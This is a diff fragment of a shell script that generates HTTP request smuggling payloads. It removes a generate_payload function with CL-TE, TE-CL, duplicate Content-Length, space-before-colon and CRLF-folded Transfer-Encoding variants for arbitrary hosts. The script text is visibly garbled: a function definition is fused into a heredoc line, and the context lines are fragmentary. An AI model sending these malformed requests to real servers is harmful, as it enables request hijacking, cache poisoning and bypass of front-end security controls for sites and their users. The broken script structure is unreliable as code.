@@ -106,37 +106,6 @@ Host: ${host}
 Transfer-Encoding: chunked
 Content-Length: 6
 
-0# Function to generate payload with different content-length/transfer-encoding combinations
-generate_payload() {
-    local method=$1
-    local url=$2
-    local payload_type=$3
-    local host=$(echo "$url" | sed -E 's|^https?://([^/]+).*|\1|')
-    local path=$(echo "$url" | sed -E 's|^https?://[^/]+(/.*)?|\1|')
-    path=${path:-/}
-
-    case "$payload_type" in
-        "cl-te")
-            cat <<EOF
-${method} ${path} HTTP/1.1
-Host: ${host}
-Content-Length: 4
-Transfer-Encoding: chunked
-
-1
-A
-0
-
-
-EOF
-            ;;
-        "te-cl")
-            cat <<EOF
-${method} ${path} HTTP/1.1
-Host: ${host}
-Transfer-Encoding: chunked
-Content-Length: 6
-
 0
 
 X
@@ -149,53 +118,6 @@ Host: ${host}
 Transfer-Encoding: identity
 Transfer-Encoding: chunked
 
-0
-
-
-EOF
-            ;;
-        "cl-cl")
-            cat <<EOF
-${method} ${path} HTTP/1.1
-Host: ${host}
-Content-Length: 5
-Content-Length: 11
-
-Hello
-World
-EOF
-            ;;
-        "space-te")
-            cat <<EOF
-${method} ${path} HTTP/1.1
-Host: ${host}
-Transfer-Encoding : chunked
-
-0
-
-
-EOF
-            ;;
-        "crlf-te")
-            printf "${method} ${path} HTTP/1.1\r
-Host: ${host}\r
-Transfer-Encoding: \r
- chunked\r
-\r
-0\r
-\r
-\r
-"
-            ;;
-        *)
-            cat <<EOF
-${method} ${path} HTTP/1.1
-Host: ${host}
-
-EOF
-            ;;
-    esac
-}
 0
 
 
